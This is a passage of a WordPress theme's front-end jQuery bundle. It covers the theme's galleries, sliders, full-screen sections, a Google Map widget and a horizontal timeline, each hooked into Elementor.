						mobileLandscape = thisItem.data('680');
					}

					if(largeLaptop.length || smallLaptop.length || ipadLandscape.length || ipadPortrait.length || mobileLandscape.length || mobilePortrait.length) {

						if(largeLaptop.length) {
							responsiveStyle += "@media only screen and (min-width: 1367px) and (max-width: 1600px) {.mkdf-eh-item-content."+itemClass+" { padding: "+largeLaptop+" !important; } }";
						}
						if(smallLaptop.length) {
							responsiveStyle += "@media only screen and (min-width: 1025px) and (max-width: 1366px) {.mkdf-eh-item-content."+itemClass+" { padding: "+smallLaptop+" !important; } }";
						}
						if(ipadLandscape.length) {
							responsiveStyle += "@media only screen and (min-width: 769px) and (max-width: 1024px) {.mkdf-eh-item-content."+itemClass+" { padding: "+ipadLandscape+" !important; } }";
						}
						if(ipadPortrait.length) {
							responsiveStyle += "@media only screen and (min-width: 681px) and (max-width: 768px) {.mkdf-eh-item-content."+itemClass+" { padding: "+ipadPortrait+" !important; } }";
						}
						if(mobileLandscape.length) {
							responsiveStyle += "@media only screen and (max-width: 680px) {.mkdf-eh-item-content."+itemClass+" { padding: "+mobileLandscape+" !important; } }";
						}
					}

                    if (typeof mkdf.modules.common.mkdfOwlSlider === "function") { // if owl function exist
                        var owl = thisItem.find('.mkdf-owl-slider');
                        if (owl.length) { // if owl is in elements holder
                            setTimeout(function () {
                                owl.trigger('refresh.owl.carousel'); // reinit owl
                            }, 100);
                        }
                    }

				});

				if(responsiveStyle.length) {
					style = '<style type="text/css">'+responsiveStyle+'</style>';
				}

				if(style.length) {
					$('head').append(style);
				}

			});
		}
	}

})(jQuery);
(function($) {
	'use strict';
	
	var expandedGallery = {};
	mkdf.modules.expandedGallery = expandedGallery;

	expandedGallery.mkdfInitExpandedGallery = mkdfInitExpandedGallery;


	expandedGallery.mkdfOnDocumentReady = mkdfOnDocumentReady;
	
	$(document).ready(mkdfOnDocumentReady);
	$(window).on('load', mkdfOnWindowLoad());

	/*
	 All functions to be called on $(document).ready() should be in this function
	 */
	function mkdfOnDocumentReady() {
		mkdfInitExpandedGallery();
	}

    /*
	All functions to be called on $(window).load() should be in this function
	*/
    function mkdfOnWindowLoad() {
        mkdfElementorExpandedGallery();
    }

    /**
     * Elementor
     */
    function mkdfElementorExpandedGallery(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_expanded_gallery.default', function() {
                mkdfInitExpandedGallery();
            } );
        });
    }

	/*
	 **	Init Expanded Gallery shortcode
	 */
	function mkdfInitExpandedGallery(){
		var holder = $('.mkdf-expanded-gallery');

		if(holder.length){
			holder.each(function() {
				var thisHolder = $(this),
					thisHolderImages = thisHolder.find('.mkdf-eg-image');

				thisHolder.find('.mkdf-eg-image:nth-child('+Math.ceil(thisHolderImages.length / 2)+')').addClass('mkdf-eg-middle-item');

				thisHolder.appear(function() {
					thisHolder.find('.mkdf-eg-middle-item').addClass('mkdf-eg-show');

					setTimeout(function(){
						thisHolder.find('.mkdf-eg-middle-item').prev().addClass('mkdf-eg-show');
						thisHolder.find('.mkdf-eg-middle-item').next().addClass('mkdf-eg-show');
					},250);

					if (thisHolder.hasClass('mkdf-eg-five')) {
						setTimeout(function(){
							thisHolder.find('.mkdf-eg-middle-item').prev().prev().addClass('mkdf-eg-show');
							thisHolder.find('.mkdf-eg-middle-item').next().next().addClass('mkdf-eg-show');
						},500);
					}
				}, {accX: 0, accY: mkdfGlobalVars.vars.mkdfElementAppearAmount});
			});
		}
	}
	
})(jQuery);
(function ($) {
	'use strict';
	
	var frameSlider = {};
	mkdf.modules.frameSlider = frameSlider;


	frameSlider.mkdfOnWindowLoad = mkdfOnWindowLoad;
	
	$(window).on('load', mkdfOnWindowLoad());
	
	/**
	 All functions to be called on $(document).ready() should be in this function
	 */
	function mkdfOnWindowLoad() {
		mkdfElementorFrameSlider();
	}


    /**
     * Elementor
     */
    function mkdfElementorFrameSlider(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_frame_slider.default', function() {
                mkdf.modules.common.mkdfOwlSlider();
            } );
        });
    }
	
})(jQuery);
(function ($) {
	'use strict';
	
	var fullScreenImageSlider = {};
	mkdf.modules.fullScreenImageSlider = fullScreenImageSlider;
	
	
	fullScreenImageSlider.mkdfOnWindowLoad = mkdfOnWindowLoad;
	
	$(window).on('load', mkdfOnWindowLoad());
	
	/**
	 All functions to be called on $(document).ready() should be in this function
	 */
	function mkdfOnWindowLoad() {
		mkdfInitFullScreenImageSlider();
        mkdfElementorFullScreenImageSlider();
	}


    /**
     * Elementor
     */
    function mkdfElementorFullScreenImageSlider(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_full_screen_image_slider.default', function() {
                mkdf.modules.common.mkdfOwlSlider();
            	mkdfInitFullScreenImageSlider();
            } );
        });
    }
	/**
	 * Init Full Screen Image Slider Shortcode
	 */
	function mkdfInitFullScreenImageSlider() {
		var holder = $('.mkdf-fsis-slider');
		
		if (holder.length) {
			holder.each(function () {
				var sliderHolder = $(this),
					mainHolder = sliderHolder.parent(),
					prevThumbNav = mainHolder.children('.mkdf-fsis-prev-nav'),
					nextThumbNav = mainHolder.children('.mkdf-fsis-next-nav'),
					maskHolder = mainHolder.children('.mkdf-fsis-slider-mask');
				
				mainHolder.addClass('mkdf-fsis-is-init');
				
				mkdfImageBehavior(sliderHolder);
				mkdfPrevNextImageBehavior(sliderHolder, prevThumbNav, nextThumbNav, -1); // -1 is arbitrary value because 0 can be index of item
				
				sliderHolder.on('drag.owl.carousel', function () {
					setTimeout(function () {
						if (!maskHolder.hasClass('mkdf-drag') && !mainHolder.hasClass('mkdf-fsis-active')) {
							maskHolder.addClass('mkdf-drag');
						}
					}, 200);
				});
				
				sliderHolder.on('dragged.owl.carousel', function () {
					setTimeout(function () {
						if (maskHolder.hasClass('mkdf-drag')) {
							maskHolder.removeClass('mkdf-drag');
						}
					}, 300);
				});
				
				sliderHolder.on('translate.owl.carousel', function (e) {
					mkdfPrevNextImageBehavior(sliderHolder, prevThumbNav, nextThumbNav, e.item.index);
				});
				
				sliderHolder.on('translated.owl.carousel', function () {
					mkdfImageBehavior(sliderHolder);
					
					setTimeout(function () {
						maskHolder.removeClass('mkdf-drag');
					}, 300);
				});
			});
		}
	}
	
	function mkdfImageBehavior(sliderHolder) {
		var activeItem = sliderHolder.find('.owl-item.active'),
			imageHolder = sliderHolder.find('.mkdf-fsis-item');
		
		imageHolder.removeClass('mkdf-fsis-content-image-init');
		
		mkdfResetImageBehavior(sliderHolder);
		
		if (activeItem.length) {
			var activeImageHolder = activeItem.find('.mkdf-fsis-item'),
				activeItemImage = activeImageHolder.children('.mkdf-fsis-image');
			
			setTimeout(function () {
				activeImageHolder.addClass('mkdf-fsis-content-image-init');
			}, 100);
			
			activeItemImage.off().on('mouseenter', function () {
				activeImageHolder.addClass('mkdf-fsis-image-hover');
			}).on('mouseleave', function () {
				activeImageHolder.removeClass('mkdf-fsis-image-hover');
			}).on('click', function () {
				if (activeImageHolder.hasClass('mkdf-fsis-active-image')) {
					sliderHolder.trigger('play.owl.autoplay');
					sliderHolder.parent().removeClass('mkdf-fsis-active');
					activeImageHolder.removeClass('mkdf-fsis-active-image');
				} else {
					sliderHolder.trigger('stop.owl.autoplay');
					sliderHolder.parent().addClass('mkdf-fsis-active');
					activeImageHolder.addClass('mkdf-fsis-active-image');
				}
			});
			
			//Close on escape
			$(document).keyup(function (e) {
				if (e.keyCode === 27) { //KeyCode for ESC button is 27
					sliderHolder.trigger('play.owl.autoplay');
					sliderHolder.parent().removeClass('mkdf-fsis-active');
					activeImageHolder.removeClass('mkdf-fsis-active-image');
				}
			});
		}
	}
	
	function mkdfPrevNextImageBehavior(sliderHolder, prevThumbNav, nextThumbNav, itemIndex) {
		var activeItem = itemIndex === -1 ? sliderHolder.find('.owl-item.active') : $(sliderHolder.find('.owl-item')[itemIndex]),
			prevItemImage = activeItem.prev().find('.mkdf-fsis-image').css('background-image'),
			nextItemImage = activeItem.next().find('.mkdf-fsis-image').css('background-image');
		console.log(prevItemImage);
		console.log(nextItemImage);
		if (prevItemImage.length) {
			prevThumbNav.css({'background-image': prevItemImage});
		}
		
		if (nextItemImage.length) {
			nextThumbNav.css({'background-image': nextItemImage});
		}
	}
	
	function mkdfResetImageBehavior(sliderHolder) {
		var imageHolder = sliderHolder.find('.mkdf-fsis-item');
		
		if (imageHolder.length) {
			imageHolder.removeClass('mkdf-fsis-active-image');
		}
	}
	
})(jQuery);
(function($) {
	'use strict';
	
	var fullScreenSections = {};
	mkdf.modules.fullScreenSections = fullScreenSections;
	
	fullScreenSections.mkdfInitFullScreenSections = mkdfInitFullScreenSections;
	
	
	fullScreenSections.mkdfOnDocumentReady = mkdfOnDocumentReady;
	
	$(document).ready(mkdfOnDocumentReady);
    $(window).on('load', mkdfOnWindowLoad());
	/*
	 All functions to be called on $(document).ready() should be in this function
	 */
	function mkdfOnDocumentReady() {
		mkdfInitFullScreenSections();
	}

    /**
     All functions to be called on $(document).ready() should be in this function
     */
    function mkdfOnWindowLoad() {
        mkdfElementorFullScreenSections();
    }


    /**
     * Elementor
     */
    function mkdfElementorFullScreenSections(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_full_screen_sections.default', function() {
                mkdfInitFullScreenSections();
            } );
        });
    }

    /**
	 **	Init full screen sections shortcode
	 */
	function mkdfInitFullScreenSections(){
		var fullScreenSections = $('.mkdf-full-screen-sections');
		
		if(fullScreenSections.length){
			fullScreenSections.each(function() {
				var thisFullScreenSections = $(this),
					fullScreenSectionsWrapper = thisFullScreenSections.children('.mkdf-fss-wrapper'),
					fullScreenSectionsItems = fullScreenSectionsWrapper.children('.mkdf-fss-item'),
					fullScreenSectionsItemsNumber = fullScreenSectionsItems.length,
					fullScreenSectionsItemsHasHeaderStyle = fullScreenSectionsItems.hasClass('mkdf-fss-item-has-style'),
					enableContinuousVertical = false,
					enableNavigationData = '',
					enablePaginationData = '';
				
				var defaultHeaderStyle = '';
				if (mkdf.body.hasClass('mkdf-light-header')) {
					defaultHeaderStyle = 'light';
				} else if (mkdf.body.hasClass('mkdf-dark-header')) {
					defaultHeaderStyle = 'dark';
				}
				
				if (typeof thisFullScreenSections.data('enable-continuous-vertical') !== 'undefined' && thisFullScreenSections.data('enable-continuous-vertical') !== false && thisFullScreenSections.data('enable-continuous-vertical') === 'yes') {
					enableContinuousVertical = true;
				}
				if (typeof thisFullScreenSections.data('enable-navigation') !== 'undefined' && thisFullScreenSections.data('enable-navigation') !== false) {
					enableNavigationData = thisFullScreenSections.data('enable-navigation');
				}
				if (typeof thisFullScreenSections.data('enable-pagination') !== 'undefined' && thisFullScreenSections.data('enable-pagination') !== false) {
					enablePaginationData = thisFullScreenSections.data('enable-pagination');
				}
				
				var enableNavigation = enableNavigationData !== 'no',
					enablePagination = enablePaginationData !== 'no';
				
				fullScreenSectionsWrapper.fullpage({
					sectionSelector: '.mkdf-fss-item',
					scrollingSpeed: 1200,
					verticalCentered: false,
					continuousVertical: enableContinuousVertical,
					navigation: enablePagination,
					onLeave: function(index, nextIndex, direction){
						if(fullScreenSectionsItemsHasHeaderStyle) {
							checkFullScreenSectionsItemForHeaderStyle($(fullScreenSectionsItems[nextIndex - 1]).data('header-style'), defaultHeaderStyle);
						}
						
						if(enableNavigation) {
							checkActiveArrowsOnFullScrrenTemplate(thisFullScreenSections, fullScreenSectionsItemsNumber, nextIndex);
						}
					},
					afterRender: function(){
                        $(this).addClass('mkdf-initialized');
						if(fullScreenSectionsItemsHasHeaderStyle) {
							checkFullScreenSectionsItemForHeaderStyle(fullScreenSectionsItems.first().data('header-style'), defaultHeaderStyle);
						}
						
						if(enableNavigation) {
							checkActiveArrowsOnFullScrrenTemplate(thisFullScreenSections, fullScreenSectionsItemsNumber, 1);
							thisFullScreenSections.children('.mkdf-fss-nav-holder').css('visibility','visible');
						}
						
						fullScreenSectionsWrapper.css('visibility','visible');
					}
				});
				
				setResposniveData(thisFullScreenSections);
				
				if(enableNavigation) {
					thisFullScreenSections.find('#mkdf-fss-nav-up').on('click', function() {
						$.fn.fullpage.moveSectionUp();
						return false;
					});
					
					thisFullScreenSections.find('#mkdf-fss-nav-down').on('click', function() {
						$.fn.fullpage.moveSectionDown();
						return false;
					});
				}
			});
		}
	}
	
	function checkFullScreenSectionsItemForHeaderStyle(section_header_style, default_header_style) {
		if (section_header_style !== undefined && section_header_style !== '') {
			mkdf.body.removeClass('mkdf-light-header mkdf-dark-header').addClass('mkdf-' + section_header_style + '-header');
		} else if (default_header_style !== '') {
			mkdf.body.removeClass('mkdf-light-header mkdf-dark-header').addClass('mkdf-' + default_header_style + '-header');
		} else {
			mkdf.body.removeClass('mkdf-light-header mkdf-dark-header');
		}
	}
	
	function checkActiveArrowsOnFullScrrenTemplate(thisFullScreenSections, fullScreenSectionsItemsNumber, index){
		var thisHolder = thisFullScreenSections,
			thisHolderArrowsUp = thisHolder.find('#mkdf-fss-nav-up'),
			thisHolderArrowsDown = thisHolder.find('#mkdf-fss-nav-down'),
			enableContinuousVertical = false;
		
		if (typeof thisFullScreenSections.data('enable-continuous-vertical') !== 'undefined' && thisFullScreenSections.data('enable-continuous-vertical') !== false && thisFullScreenSections.data('enable-continuous-vertical') === 'yes') {
			enableContinuousVertical = true;
		}
		
		if (index === 1 && !enableContinuousVertical) {
			thisHolderArrowsUp.css({'opacity': '0', 'height': '0', 'visibility': 'hidden'});
			thisHolderArrowsDown.css({'opacity': '0', 'height': '0', 'visibility': 'hidden'});
			
			if(index !== fullScreenSectionsItemsNumber){
				thisHolderArrowsDown.css({'opacity': '1', 'height': 'auto', 'visibility': 'visible'});
			}
		} else if (index === fullScreenSectionsItemsNumber && !enableContinuousVertical) {
			thisHolderArrowsDown.css({'opacity': '0', 'height': '0', 'visibility': 'hidden'});
			
			if(fullScreenSectionsItemsNumber === 2){
				thisHolderArrowsUp.css({'opacity': '1', 'height': 'auto', 'visibility': 'visible'});
			}
		} else {
			thisHolderArrowsUp.css({'opacity': '1', 'height': 'auto', 'visibility': 'visible'});
			thisHolderArrowsDown.css({'opacity': '1', 'height': 'auto', 'visibility': 'visible'});
		}
	}
	
	function setResposniveData(thisFullScreenSections) {
		var fullScreenSections = thisFullScreenSections.find('.mkdf-fss-item'),
			responsiveStyle = '',
			style = '';
		
		fullScreenSections.each(function(){
			var thisSection = $(this),
				itemClass = '',
				imageLaptop = '',
				imageTablet = '',
				imagePortraitTablet = '',
				imageMobile = '';
			
			if (typeof thisSection.data('item-class') !== 'undefined' && thisSection.data('item-class') !== false) {
				itemClass = thisSection.data('item-class');
			}
			if (typeof thisSection.data('laptop-image') !== 'undefined' && thisSection.data('laptop-image') !== false) {
				imageLaptop = thisSection.data('laptop-image');
			}
			if (typeof thisSection.data('tablet-image') !== 'undefined' && thisSection.data('tablet-image') !== false) {
				imageTablet = thisSection.data('tablet-image');
			}
			if (typeof thisSection.data('tablet-portrait-image') !== 'undefined' && thisSection.data('tablet-portrait-image') !== false) {
				imagePortraitTablet = thisSection.data('tablet-portrait-image');
			}
			if (typeof thisSection.data('mobile-image') !== 'undefined' && thisSection.data('mobile-image') !== false) {
				imageMobile = thisSection.data('mobile-image');
			}
			
			if (imageLaptop.length || imageTablet.length || imagePortraitTablet.length || imageMobile.length) {
				
				if (imageLaptop.length) {
					responsiveStyle += "@media only screen and (max-width: 1366px) {.mkdf-fss-item." + itemClass + " { background-image: url(" + imageLaptop + ") !important; } }";
				}
				if (imageTablet.length) {
					responsiveStyle += "@media only screen and (max-width: 1024px) {.mkdf-fss-item." + itemClass + " { background-image: url( " + imageTablet + ") !important; } }";
				}
				if (imagePortraitTablet.length) {
					responsiveStyle += "@media only screen and (max-width: 800px) {.mkdf-fss-item." + itemClass + " { background-image: url( " + imagePortraitTablet + ") !important; } }";
				}
				if (imageMobile.length) {
					responsiveStyle += "@media only screen and (max-width: 680px) {.mkdf-fss-item." + itemClass + " { background-image: url( " + imageMobile + ") !important; } }";
				}
			}
		});
		
		if (responsiveStyle.length) {
			style = '<style type="text/css">' + responsiveStyle + '</style>';
		}
		
		if (style.length) {
			$('head').append(style);
		}
	}
	
})(jQuery);
(function ($) {
	'use strict';
	
	var galleryBlocks = {};
	mkdf.modules.galleryBlocks = galleryBlocks;


    galleryBlocks.mkdfOnWindowLoad = mkdfOnWindowLoad;
	
	$(window).on('load', mkdfOnWindowLoad());
	
	/**
	 All functions to be called on $(document).ready() should be in this function
	 */
	function mkdfOnWindowLoad() {
        mkdfElementorGlleryBlocks();
	}


    /**
     * Elementor Team Carousel
     */
    function mkdfElementorGlleryBlocks() {
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction('frontend/element_ready/mkdf_gallery_blocks.default', function () {
                mkdf.modules.common.mkdfPrettyPhoto();
            });
        });
    }
	
})(jQuery);
(function($) {
	'use strict';
	
	var googleMap = {};
	mkdf.modules.googleMap = googleMap;
	
	googleMap.mkdfShowGoogleMap = mkdfShowGoogleMap;
	
	
	googleMap.mkdfOnDocumentReady = mkdfOnDocumentReady;
	
	$(document).ready(mkdfOnDocumentReady);
	$(window).on('load', mkdfOnWindowLoad());

	/*
	 All functions to be called on $(document).ready() should be in this function
	 */
	function mkdfOnDocumentReady() {
		mkdfShowGoogleMap();
	}

    /*
	All functions to be called on $(window).load() should be in this function
	*/
    function mkdfOnWindowLoad() {
        mkdfElementorShowGoogleMap();
    }

    /**
     * Elementor
     */
    function mkdfElementorShowGoogleMap(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_google_map.default', function() {
                mkdfShowGoogleMap();
            } );
        });
    }

	/*
	 **	Show Google Map
	 */
	function mkdfShowGoogleMap(){
		var googleMap = $('.mkdf-google-map');
		
		if(googleMap.length){
			googleMap.each(function(){
				var element = $(this);
				
				var snazzyMapStyle = false;
				var snazzyMapCode  = '';
				if(typeof element.data('snazzy-map-style') !== 'undefined' && element.data('snazzy-map-style') === 'yes') {
					snazzyMapStyle = true;
					var snazzyMapHolder = element.parent().find('.mkdf-snazzy-map'),
						snazzyMapCodes  = snazzyMapHolder.val();
					
					if( snazzyMapHolder.length && snazzyMapCodes.length ) {
						snazzyMapCode = JSON.parse( snazzyMapCodes.replace(/`{`/g, '[').replace(/`}`/g, ']').replace(/``/g, '"').replace(/`/g, '') );
					}
				}
				
				var customMapStyle;
				if(typeof element.data('custom-map-style') !== 'undefined') {
					customMapStyle = element.data('custom-map-style');
				}
				
				var colorOverlay;
				if(typeof element.data('color-overlay') !== 'undefined' && element.data('color-overlay') !== false) {
					colorOverlay = element.data('color-overlay');
				}
				
				var saturation;
				if(typeof element.data('saturation') !== 'undefined' && element.data('saturation') !== false) {
					saturation = element.data('saturation');
				}
				
				var lightness;
				if(typeof element.data('lightness') !== 'undefined' && element.data('lightness') !== false) {
					lightness = element.data('lightness');
				}
				
				var zoom;
				if(typeof element.data('zoom') !== 'undefined' && element.data('zoom') !== false) {
					zoom = element.data('zoom');
				}
				
				var pin;
				if(typeof element.data('pin') !== 'undefined' && element.data('pin') !== false) {
					pin = element.data('pin');
				}
				
				var mapHeight;
				if(typeof element.data('height') !== 'undefined' && element.data('height') !== false) {
					mapHeight = element.data('height');
				}
				
				var uniqueId;
				if(typeof element.data('unique-id') !== 'undefined' && element.data('unique-id') !== false) {
					uniqueId = element.data('unique-id');
				}
				
				var scrollWheel;
				if(typeof element.data('scroll-wheel') !== 'undefined') {
					scrollWheel = element.data('scroll-wheel');
				}
				var addresses;
				if(typeof element.data('addresses') !== 'undefined' && element.data('addresses') !== false) {
					addresses = element.data('addresses');
				}
				
				var map = "map_"+ uniqueId;
				var geocoder = "geocoder_"+ uniqueId;
				var holderId = "mkdf-map-"+ uniqueId;
				
				mkdfInitializeGoogleMap(snazzyMapStyle, snazzyMapCode, customMapStyle, colorOverlay, saturation, lightness, scrollWheel, zoom, holderId, mapHeight, pin,  map, geocoder, addresses);
			});
		}
	}
	
	/*
	 **	Init Google Map
	 */
	function mkdfInitializeGoogleMap(snazzyMapStyle, snazzyMapCode, customMapStyle, color, saturation, lightness, wheel, zoom, holderId, height, pin,  map, geocoder, data){
		
		if(typeof google !== 'object') {
			return;
		}
		
		var mapStyles = [];
		if(snazzyMapStyle && snazzyMapCode.length) {
			mapStyles = snazzyMapCode;
		} else {
			mapStyles = [
				{
					stylers: [
						{hue: color },
						{saturation: saturation},
						{lightness: lightness},
						{gamma: 1}
					]
				}
			];
		}
		
		var googleMapStyleId;
		
		if(snazzyMapStyle || customMapStyle === 'yes'){
			googleMapStyleId = 'mkdf-style';
		} else {
			googleMapStyleId = google.maps.MapTypeId.ROADMAP;
		}
		
		wheel = wheel === 'yes';
		
		var qoogleMapType = new google.maps.StyledMapType(mapStyles, {name: "Google Map"});
		
		geocoder = new google.maps.Geocoder();
		var latlng = new google.maps.LatLng(-34.397, 150.644);
		
		if (!isNaN(height)){
			height = height + 'px';
		}
		
		var myOptions = {
			zoom: zoom,
			scrollwheel: wheel,
			center: latlng,
			zoomControl: true,
			zoomControlOptions: {
				style: google.maps.ZoomControlStyle.SMALL,
				position: google.maps.ControlPosition.RIGHT_CENTER
			},
			scaleControl: false,
			scaleControlOptions: {
				position: google.maps.ControlPosition.LEFT_CENTER
			},
			streetViewControl: false,
			streetViewControlOptions: {
				position: google.maps.ControlPosition.LEFT_CENTER
			},
			panControl: false,
			panControlOptions: {
				position: google.maps.ControlPosition.LEFT_CENTER
			},
			mapTypeControl: false,
			mapTypeControlOptions: {
				mapTypeIds: [google.maps.MapTypeId.ROADMAP, 'mkdf-style'],
				style: google.maps.MapTypeControlStyle.HORIZONTAL_BAR,
				position: google.maps.ControlPosition.LEFT_CENTER
			},
			mapTypeId: googleMapStyleId
		};
		
		map = new google.maps.Map(document.getElementById(holderId), myOptions);
		map.mapTypes.set('mkdf-style', qoogleMapType);
		
		var index;
		
		for (index = 0; index < data.length; ++index) {
			mkdfInitializeGoogleAddress(data[index], pin, map, geocoder);
		}
		
		var holderElement = document.getElementById(holderId);
		holderElement.style.height = height;
	}
	
	/*
	 **	Init Google Map Addresses
	 */
	function mkdfInitializeGoogleAddress(data, pin, map, geocoder){
		if (data === '') {
			return;
		}
		
		var contentString = '<div id="content">'+
			'<div id="siteNotice">'+
			'</div>'+
			'<div id="bodyContent">'+
			'<p>'+data+'</p>'+
			'</div>'+
			'</div>';
		
		var infowindow = new google.maps.InfoWindow({
			content: contentString
		});
		
		geocoder.geocode( { 'address': data}, function(results, status) {
			if (status === google.maps.GeocoderStatus.OK) {
				map.setCenter(results[0].geometry.location);
				var marker = new google.maps.Marker({
					map: map,
					position: results[0].geometry.location,
					icon:  pin,
					title: data.store_title
				});
				google.maps.event.addListener(marker, 'click', function() {
					infowindow.open(map,marker);
				});
				
				google.maps.event.addDomListener(window, 'resize', function() {
					map.setCenter(results[0].geometry.location);
				});
			}
		});
	}
	
})(jQuery);
(function ($) {
	'use strict';
	
	var timeline = {};
	mkdf.modules.timeline = timeline;
	
	timeline.mkdfInitHorizontalTimeline = mkdfInitHorizontalTimeline;
	
	
	timeline.mkdfOnDocumentReady = mkdfOnDocumentReady;
	
	$(document).ready(mkdfOnDocumentReady);
    $(window).on('load', mkdfOnWindowLoad());

	/**
	 ** All functions to be called on $(window).load() should be in this function
	 */
	function mkdfOnDocumentReady() {
		mkdfInitHorizontalTimeline().init();
	}


    /**
     All functions to be called on $(window).load() should be in this function
     */
    function mkdfOnWindowLoad() {
        mkdfElementorHorizontalTimeline();
    }

    /**
     * Elementor
     */
    function mkdfElementorHorizontalTimeline(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_horizontal_timeline.default', function() {
                mkdfInitHorizontalTimeline().init();
            } );
        });
    }
	
	function mkdfInitHorizontalTimeline() {
		var timelines = $('.mkdf-horizontal-timeline'),
			eventsMinDistance;
		
		function initTimeline(timelines) {
			timelines.each(function () {
				var timeline = $(this),
					timelineComponents = {};
				
				eventsMinDistance = timeline.data('distance');
				
				//cache timeline components
				timelineComponents['timelineNavWrapper'] = timeline.find('.mkdf-ht-nav-wrapper');
				timelineComponents['timelineNavWrapperWidth'] = timelineComponents['timelineNavWrapper'].width();
				timelineComponents['timelineNavInner'] = timelineComponents['timelineNavWrapper'].find('.mkdf-ht-nav-inner');
				timelineComponents['fillingLine'] = timelineComponents['timelineNavInner'].find('.mkdf-ht-nav-filling-line');
				timelineComponents['timelineEvents'] = timelineComponents['timelineNavInner'].find('a');
				timelineComponents['timelineDates'] = parseDate(timelineComponents['timelineEvents']);
				timelineComponents['eventsMinLapse'] = minLapse(timelineComponents['timelineDates']);
				timelineComponents['timelineNavigation'] = timeline.find('.mkdf-ht-nav-navigation');
				timelineComponents['timelineEventContent'] = timeline.find('.mkdf-ht-content');
				
				//select initial event
				timelineComponents['timelineEvents'].first().addClass('mkdf-selected');
				timelineComponents['timelineEventContent'].find('li').first().addClass('mkdf-selected');
				
				//assign a left postion to the single events along the timeline
				setDatePosition(timelineComponents, eventsMinDistance);
				
				//assign a width to the timeline
				var timelineTotWidth = setTimelineWidth(timelineComponents, eventsMinDistance);
				
				//the timeline has been initialize - show it
				timeline.addClass('mkdf-loaded');
				
				//detect click on the next arrow
				timelineComponents['timelineNavigation'].on('click', '.mkdf-next', function (e) {
					e.preventDefault();
					updateSlide(timelineComponents, timelineTotWidth, 'next');
				});
				
				//detect click on the prev arrow
				timelineComponents['timelineNavigation'].on('click', '.mkdf-prev', function (e) {
					e.preventDefault();
					updateSlide(timelineComponents, timelineTotWidth, 'prev');
				});
				
				//detect click on the a single event - show new event content
				timelineComponents['timelineNavInner'].on('click', 'a', function (e) {
					e.preventDefault();
					
					var thisItem = $(this);
					
					timelineComponents['timelineEvents'].removeClass('mkdf-selected');
					thisItem.addClass('mkdf-selected');
					
					updateOlderEvents(thisItem);
					updateFilling(thisItem, timelineComponents['fillingLine'], timelineTotWidth);
					updateVisibleContent(thisItem, timelineComponents['timelineEventContent']);
				});
				
				var mq = checkMQ();
				
				//on swipe, show next/prev event content
				timelineComponents['timelineEventContent'].on('swipeleft', function(){
					( mq === 'mobile' ) && showNewContent(timelineComponents, timelineTotWidth, 'next');
				});
				timelineComponents['timelineEventContent'].on('swiperight', function(){
					( mq === 'mobile' ) && showNewContent(timelineComponents, timelineTotWidth, 'prev');
				});
				
				//keyboard navigation
				$(document).keyup(function (event) {
					if (event.which === '37' && elementInViewport(timeline.get(0))) {
						showNewContent(timelineComponents, timelineTotWidth, 'prev');
					} else if (event.which === '39' && elementInViewport(timeline.get(0))) {
						showNewContent(timelineComponents, timelineTotWidth, 'next');
					}
				});
			});
		}
		
		function updateSlide(timelineComponents, timelineTotWidth, string) {
			//retrieve translateX value of timelineComponents['timelineNavInner']
			var translateValue = getTranslateValue(timelineComponents['timelineNavInner']),
				wrapperWidth = Number(timelineComponents['timelineNavWrapper'].css('width').replace('px', ''));
			//translate the timeline to the left('next')/right('prev')
			if(string === 'next') {
				translateTimeline(timelineComponents, translateValue - wrapperWidth + eventsMinDistance, wrapperWidth - timelineTotWidth);
			} else {
				translateTimeline(timelineComponents, translateValue + wrapperWidth - eventsMinDistance);
			}
		}
		
		function showNewContent(timelineComponents, timelineTotWidth, string) {
			//go from one event to the next/previous one
			var visibleContent = timelineComponents['timelineEventContent'].find('.mkdf-selected'),
				newContent = (string === 'next') ? visibleContent.next() : visibleContent.prev();
			
			if (newContent.length > 0) { //if there's a next/prev event - show it
				var selectedDate = timelineComponents['timelineNavInner'].find('.mkdf-selected'),
					newEvent = (string === 'next') ? selectedDate.parent('li').next('li').children('a') : selectedDate.parent('li').prev('li').children('a');
				
				updateFilling(newEvent, timelineComponents['fillingLine'], timelineTotWidth);
				updateVisibleContent(newEvent, timelineComponents['timelineEventContent']);
				
				newEvent.addClass('mkdf-selected');
				selectedDate.removeClass('mkdf-selected');
				
				updateOlderEvents(newEvent);
				updateTimelinePosition(string, newEvent, timelineComponents);
			}
		}
		
		function updateTimelinePosition(string, event, timelineComponents) {
			//translate timeline to the left/right according to the position of the mkdf-selected event
			var eventStyle = window.getComputedStyle(event.get(0), null),
				eventLeft = Number(eventStyle.getPropertyValue("left").replace('px', '')),
				timelineWidth = Number(timelineComponents['timelineNavWrapper'].css('width').replace('px', '')),
				timelineTotWidth = Number(timelineComponents['timelineNavInner'].css('width').replace('px', '')),
				timelineTranslate = getTranslateValue(timelineComponents['timelineNavInner']);
			
			if ((string === 'next' && eventLeft > timelineWidth - timelineTranslate) || (string === 'prev' && eventLeft < -timelineTranslate)) {
				translateTimeline(timelineComponents, -eventLeft + timelineWidth / 2, timelineWidth - timelineTotWidth);
			}
		}
		
		function translateTimeline(timelineComponents, value, totWidth) {
			var timelineNavInner = timelineComponents['timelineNavInner'].get(0);
			
			value = (value > 0) ? 0 : value; //only negative translate value
			value = (!(typeof totWidth === 'undefined') && value < totWidth) ? totWidth : value; //do not translate more than timeline width
			
			setTransformValue(timelineNavInner, 'translateX', value + 'px');
			
			//update navigation arrows visibility
			(value === 0) ? timelineComponents['timelineNavigation'].find('.mkdf-prev').addClass('mkdf-inactive') : timelineComponents['timelineNavigation'].find('.mkdf-prev').removeClass('mkdf-inactive');
			(value === totWidth) ? timelineComponents['timelineNavigation'].find('.mkdf-next').addClass('mkdf-inactive') : timelineComponents['timelineNavigation'].find('.mkdf-next').removeClass('mkdf-inactive');
		}
		
		function updateFilling(selectedEvent, filling, totWidth) {
			//change .mkdf-ht-nav-filling-line length according to the mkdf-selected event
